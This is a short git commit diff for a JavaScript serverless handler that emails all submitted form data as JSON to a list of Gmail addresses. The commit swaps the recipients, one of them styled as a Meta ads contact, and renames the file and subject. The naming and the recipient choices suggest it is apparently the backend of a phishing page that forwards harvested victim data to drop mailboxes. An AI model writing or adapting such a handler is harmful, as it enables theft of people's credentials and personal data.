83d85ae56d12b28938e0bca6371728cdbd07a7ba
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-03-15 02:38:54 +0500

    Update and rename azhar.js to GF.js

--- GF.js
+++ GF.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,azharalinizamani005@gmail.com",
-      subject: "azhar",
+      to: "ta0134750@gmail.com,contact.meta.ads.companyo@gmail.com",
+      subject: "GF",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
